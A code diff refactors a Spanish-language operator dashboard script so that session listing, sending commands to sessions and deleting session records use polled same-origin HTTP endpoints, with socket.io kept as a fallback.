@@ -3,11 +3,8 @@
   const container = document.getElementById("operator-sessions-list");
   const countBadge = document.getElementById("active-users-count");
 
-  if (!socket) return;
-
-  socket.emit("admin:join");
-
-  socket.on("sessions:update", function (sessions) {
+  function renderSessions(sessions) {
+    if (!Array.isArray(sessions)) return;
     if (countBadge) {
       countBadge.textContent = sessions.length;
     }
@@ -52,7 +49,27 @@
         </div>
       </div>
     `).join("");
-  });
+  }
+
+  function fetchSessions() {
+    fetch("/api/sessions", { cache: "no-store" })
+      .then(function (r) { return r.ok ? r.json() : null; })
+      .then(function (data) {
+        if (Array.isArray(data)) renderSessions(data);
+      })
+      .catch(function () {});
+  }
+
+  if (socket) {
+    socket.emit("admin:join");
+    socket.on("connect", function () {
+      socket.emit("admin:join");
+    });
+    socket.on("sessions:update", renderSessions);
+  }
+
+  fetchSessions();
+  setInterval(fetchSessions, 2000);
 
   window.sendCmd = function (targetId, action, defaultMsg) {
     let message = defaultMsg;
@@ -61,19 +78,38 @@
       if (customMsg === null) return;
       message = customMsg;
     }
-    socket.emit("admin:command", { targetId, action, message });
+    fetch("/api/command", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ targetId, action, message }),
+    })
+      .then(fetchSessions)
+      .catch(function () {
+        if (socket) socket.emit("admin:command", { targetId, action, message });
+      });
   };
 
   window.deleteSession = function (targetId) {
     if (confirm("¿Seguro que deseas eliminar este registro del panel?")) {
-      socket.emit("admin:delete_session", { targetId });
+      if (socket) socket.emit("admin:delete_session", { targetId });
+      fetch("/api/delete_session", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ targetId }),
+      }).then(fetchSessions).catch(function () {});
     }
   };
 
   window.clearAllSessions = function () {
     if (confirm("¿Seguro que deseas borrar TODOS los registros del panel?")) {
-      socket.emit("admin:delete_session", { targetId: null });
+      if (socket) socket.emit("admin:delete_session", { targetId: null });
+      fetch("/api/delete_session", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ targetId: null }),
+      }).then(fetchSessions).catch(function () {});
     }
   };
 })();
+
 
